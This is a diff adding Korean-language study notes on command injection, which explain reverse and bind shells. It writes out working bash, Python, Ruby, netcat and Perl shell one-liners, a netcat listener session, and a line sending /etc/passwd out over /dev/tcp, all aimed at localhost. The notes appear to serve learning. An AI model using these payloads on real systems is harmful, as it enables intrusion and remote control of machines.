@@ -265,7 +265,51 @@
                     ```linux
                     cat /etc/passwd > /dev/tcp/127.0.0.1/8080
                     ```
-    - **Reverse Shell / Bind Shell**
+    - **Reverse Shell / Bind Shell**: 임의로 실행할 쉘 명령어를 네트워크를 통해 입력하거나 출력하여 공격하는 기법
+        + **Reverse Shell**(리버스 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 공격자의 서버로 쉘을 연결하는 것 *→ Network Outbound*
+            - sh & bash를 이용하는 방법
+                + **```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로**를 사용해 포트를 서비스하는 서버에 공격 대상의 서버를 실행시킬 수 있음 <br/> &nbsp;&nbsp; → 경로를 입력한 IP 주소를 가진 서버에서 특정 포트를 열고 기다린 후 명령어를 실행하면 쉘을 획득할 수 있음
+                + 예시
+                    - 공격 대상 서버 (victim)
+                        ```linux
+                        /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
+                        /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
+                        ```
+                    - 공격자 서버 (attacker)
+                        ```linux
+                        $ nc -l -p 8080 -k -v
+                        Listening on [0.0.0.0] (family 0, port 8080)
+                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
+                        $ id
+                        uid=1000(user1) gid=1000(user1) groups=1000(user1)
+                        ```
+                        + 127.0.0.1(IP 주소)를 가진 공격자 서버는 8080번 포트를 열고 공격 전에 미리 대기하고 있어야 함 <br/> &nbsp;&nbsp; → 연결을 맺게 되면 명령어를 실행하면 쉘을 획득할 수 있음
+            - 특정 언어를 이용하는 방법
+                + **command line에서 코드를 실행할 수 있는 Python, Rudy 등의 언어**를 이용하여 command line에서 소켓을 사용해 리버스 쉘 공격을 수행함
+                + 예시: command line에 아래의 Python/Ruby 코드를 입력함
+                    - Python
+                        ```python
+                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+                        ```
+                    - Ruby
+                        ```ruby
+                        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8000");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+                        ```
+        + **Bind Shell**(바인드 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 특정 포트로 쉘을 서비스하는 것 *→ Network Inbound*
+            - nc(netcat)를 이용하는 방법
+                + 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 제공하는 **```-e``` 옵션을 이용**해 포트를 열고 ```/bin/sh```를 실행시킴 <br/> &nbsp;&nbsp; ↳ *버전에 따라 ```-e``` 옵션을 지원하지 않을 수도 있음*
+                + 예시
+                    ```linux
+                    nc -nlvp 8080 -e /bin/sh
+                    ncat -nlvp 8080 -e/bin/sh
+                    ```
+            - 특정 언어(perl)를 이용하는 방법
+                + 펄 스크립트를 작성해서 특정 포트를 쉘(```/bin/sh```)와 함께 바인딩할 수 있음
+                + 예시
+                    ```perl
+                    perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+                    ```
+    - **파일 생성**
 
 <br/><br/><br/>
 
